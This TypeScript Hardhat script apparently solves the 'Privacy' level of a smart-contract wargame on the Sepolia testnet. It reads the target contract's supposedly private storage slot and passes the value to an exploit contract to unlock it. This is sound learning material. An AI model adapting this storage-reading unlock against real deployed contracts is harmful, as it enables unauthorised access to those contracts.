import { ethers } from "hardhat";

/**
 * Execute the exploit on the Privacy contract to unlock it
 * by reading the private storage and using it as the unlock key
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress DATA_SLOT_VALUE=0xYourStorageValue npx hardhat run scripts/level-12-privacy/execute-privacy-exploit.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No PrivacyExploit contract address provided.");
    console.error("Please provide the address of your deployed PrivacyExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress DATA_SLOT_VALUE=0xYourStorageValue npx hardhat run scripts/level-12-privacy/execute-privacy-exploit.ts --network sepolia");
    return;
  }
  const exploitAddress = process.env.EXPLOIT_ADDRESS;

  // Get target contract address from environment variable or use the one from the exploit contract
  let targetAddress: string;
  if (process.env.TARGET_ADDRESS) {
    targetAddress = process.env.TARGET_ADDRESS;
  } else {
    // We'll get it from the exploit contract
    targetAddress = "";
  }
  
  console.log(`Using PrivacyExploit contract address: ${exploitAddress}`);
  
  // Get the contract factory for PrivacyExploit
  const PrivacyExploit = await ethers.getContractFactory("PrivacyExploit");
  
  // Connect to the deployed contract
  const privacyExploit = PrivacyExploit.attach(exploitAddress);
  
  console.log(`Connected to PrivacyExploit contract at: ${exploitAddress}`);
  
  // If TARGET_ADDRESS wasn't provided, get it from the exploit contract
  if (!targetAddress) {
    targetAddress = await privacyExploit.getFunction("privacyAddress")();
  }
  console.log(`Target Privacy contract address: ${targetAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check the initial state of the Privacy contract
    console.log("Checking initial Privacy contract state...");
    const initialLocked = await privacyExploit.getFunction("checkLocked")();
    
    console.log(`Initially locked: ${initialLocked}`);
    
    if (!initialLocked) {
      console.log("Privacy contract is already unlocked! No need to proceed further.");
      return;
    }
    
    // Get the storage data from the environment variable or read it from the chain
    let storageData: string;
    
    if (process.env.DATA_SLOT_VALUE) {
      storageData = process.env.DATA_SLOT_VALUE;
    } else {
      // Read the storage data from the blockchain
      // For Privacy, data[2] is at storage slot 5 
      // (slots 0-2 are used by locked, ID, and the uint8/uint16 variables, slot 3-5 are used by the data array)
      console.log("Reading storage data from blockchain...");
      storageData = await ethers.provider.getStorage(targetAddress, 5);
    }
    
    console.log(`Storage data (data[2]): ${storageData}`);
    
    // Execute the attack
    console.log("Executing unlock with extracted key...");
    const unlockTx = await privacyExploit.getFunction("unlockPrivacy")(storageData);
    
    // Wait for the transaction to be mined
    console.log("Waiting for unlock transaction to be mined...");
    const unlockReceipt = await unlockTx.wait();
    
    // Check the final state of the Privacy contract
    const finalLocked = await privacyExploit.getFunction("checkLocked")();
    
    console.log(`Finally locked: ${finalLocked}`);
    
    // Check if the attack was successful
    if (!finalLocked) {
      console.log("\nExploit successful! The Privacy contract has been unlocked.");
    } else {
      console.log("\nExploit failed. The Privacy contract is still locked.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (unlockReceipt) {
      console.log(`\nUnlock transaction details:`);
      console.log(`Hash: ${unlockReceipt.hash}`);
      console.log(`Gas used: ${unlockReceipt.gasUsed.toString()}`);
      console.log(`Block number: ${unlockReceipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
